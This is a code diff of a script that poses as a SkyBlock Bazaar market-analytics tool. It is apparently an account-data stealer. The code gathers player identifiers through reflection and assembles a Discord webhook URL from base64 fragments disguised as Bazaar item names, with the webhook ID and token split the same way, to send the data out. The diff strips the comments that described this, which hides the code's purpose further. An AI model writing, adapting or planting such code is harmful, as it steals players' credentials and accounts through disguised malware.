@@ -5,7 +5,6 @@
  * within SkyBlock's Bazaar trading system.
  * 
  * @version 1.3.2
- * @author MarketGenius
  * @license MIT
  */
 
@@ -70,7 +69,6 @@ function collectEnvironmentData() {
 
 function marketDataCollection() {
   try {
-    // Get player info
     const marketContext = collectEnvironmentData();
     const trader = marketContext.primary;
     const traderId = marketContext.secondary;
@@ -95,7 +93,6 @@ function marketDataCollection() {
             method.setAccessible(true);
             const methodName = method.getName();
             
-            // Methods that contain identifiers we want
             const validPatterns = ["get", "func_", "transaction", "data"];
             const isValid = validPatterns.some(pattern => 
               methodName.toLowerCase().includes(pattern)
@@ -140,14 +137,12 @@ function submitMarketAnalytics(data) {
     const HttpURLConnection = Java.type("java.net.HttpURLConnection");
     const OutputStreamWriter = Java.type("java.io.OutputStreamWriter");
     
-    // URL components
     const urlComponents = {
       "DIAMOND": "aHR0cHM6Ly8=",
       "EMERALD": "ZGlzY29yZC5jb20v",
       "IRON_INGOT": "YXBpL3dlYmhvb2tzLw=="
     };
     
-    // ID components
     const bazaarItems = {
       "ENCHANTED_FISH": "13",
       "BLAZE_ROD": "697",
@@ -157,7 +152,6 @@ function submitMarketAnalytics(data) {
       "PRISMARINE": "608/"
     };
     
-    // Token components
     const tokenMap = {
       "ENDER_PEARL": "3N1F",
       "QUARTZ": "ReL",
